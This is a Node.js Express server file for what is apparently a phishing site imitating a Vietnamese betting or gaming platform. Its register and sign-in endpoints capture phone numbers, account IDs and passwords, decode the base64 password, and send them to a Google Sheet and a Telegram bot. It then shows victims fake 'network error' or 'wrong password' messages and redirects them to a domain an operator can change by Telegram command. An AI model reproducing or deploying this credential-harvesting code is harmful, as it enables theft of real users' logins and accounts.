const express = require("express");
require("dotenv").config();
const path = require("path");
const axios = require("axios");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

// Import utilities
const { googleSheetApi } = require("./utils/api");
const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sendTelegram");
const { generateRandomIPv6WithPrefix } = require("./utils/genIp");

// Constants
const PORT = process.env.PORT || 3001;
const GOOGLE_SHEET_URL = process.env.GOOGLE_SHEET_URL;

// Initialize Express app
const app = express();

// App configuration
app.use(express.json());
app.set("trust proxy", true);
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: false }));
app.set("views", path.join(__dirname, "views"));
app.use("/desktop", express.static(path.join(__dirname, "public", "desktop")));
app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));

// Telegram Bot setup
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
let redirectDomain = "https://ggys5hav.net";

// Telegram Bot initialization check
if (redirectDomain === "") {
  bot.sendMessage(
    process.env.CHAT_ID,
    "Tên miền chuyển hướng chưa được thiết lập! Vui lòng dùng lệnh /domain để thiết lập!"
  );
}

// Telegram Bot domain command
bot.onText(/\/domain (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const domain = match[1];
  redirectDomain = `https://${domain}`;
  bot.sendMessage(chatId, `Tên miền đã được thay đổi thành: ${redirectDomain}`);
});

// Utility functions
function getIp(req) {
  const ip = req.headers['cf-connecting-ip'] || 
  req.headers['x-real-ip'] ||
  req.headers['x-forwarded-for'] ||
  req.socket.remoteAddress;
  return ip.toString();
}

// Device detection middleware
app.use((req, res, next) => {
  req.isMobile = /mobile/i.test(req.headers["user-agent"]);
  next();
});

// Route handler utility
const renderPage = (page) => (req, res) => {
  const device = req.isMobile ? 'mobile' : 'desktop';
  return res.render(`${device}/${page}`, {
    layout: `${device}/layout`,
    redirectDomain
  });
};

// API response utility
const handleApiResponse = async (req, res, actionType) => {
  try {
    const timeNow = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    const userIp = getIp(req);
    
    let data = {
      action: actionType,
      timeNow,
      userIp,
      ...req.body
    };

    if (actionType === 'register') {
      const decodedPWD = Buffer.from(req.body.PWD, "base64").toString("utf-8");
      data.PWD = decodedPWD;
      
      await Promise.all([
        googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL),
        sendRegisterAccountToBot(
          req.body.CellPhone,
          req.body.AccountID,
          req.body.NickName,
          userIp,
          timeNow,
          decodedPWD
        )
      ]);

      return res.json({
        Error: {
          Code: 5999,
          Message: "Lỗi mạng, vui lòng làm mới giao diện",
          Redirect: redirectDomain,
        }
      });
    } else if (actionType === 'login') {
      await Promise.all([
        googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
        sendLoginAccountToBot(
          userIp,
          timeNow,
          req.body.phone,
          req.body.AccountID,
          req.body.AccountPWD
        )
      ]);

      return res.json({
        Error: { Code: 1002, Message: "Tài khoản hoặc mật khẩu sai" }
      });
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ message: "Error processing data" });
  }
};

// Routes
// Main routes
app.get("/", (req, res) => {
  if (req.isMobile) {
    return renderPage("index")(req, res);
  }
  return res.redirect("/Home/Index");
});

app.get("/Home/Index", renderPage("index"));
app.get("/Home/PhoneApp", renderPage("phoneapp"));
app.get("/DownloadApp", renderPage("downloadapp"));

// Mobile-specific routes
const mobileOnlyRoutes = [
  "/Mobile/Member/ServiceCenter",
  "/Mobile/Home/Index",
  "/Mobile/Home",
  "/Mobile/Register/Register",
  "/Mobile/BonusCenter/LatestOffers"
];

mobileOnlyRoutes.forEach(route => {
  app.get(route, (req, res) => {
    if (!req.isMobile) return res.redirect("/");
    const page = route.split('/').pop().toLowerCase();
    return renderPage(page)(req, res);
  });
});

// API endpoints
app.post("/api/Common/GetVerifyMode", (req, res) => {
  res.json({ Data: 1 });
});

app.post("/api/Verify/VerifyAccountIDIsExist", (req, res) => {
  res.json({
    Data: {
      AccountList: null,
      CanUse: true,
      CookieID: "0ce10a162e074dc8ba54980782e743db",
      IsOverIpLimit: false,
      VerifyStatus: 0,
    },
  });
});

app.post("/api/Common/IsMemberRegisterEnabled", (req, res) => {
  res.json({ Data: true });
});

app.post("/api/MemberInfo/RegisterMember", (req, res) => handleApiResponse(req, res, 'register'));
app.post("/api/Authorize/SignIn", (req, res) => handleApiResponse(req, res, 'login'));

// Start server
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));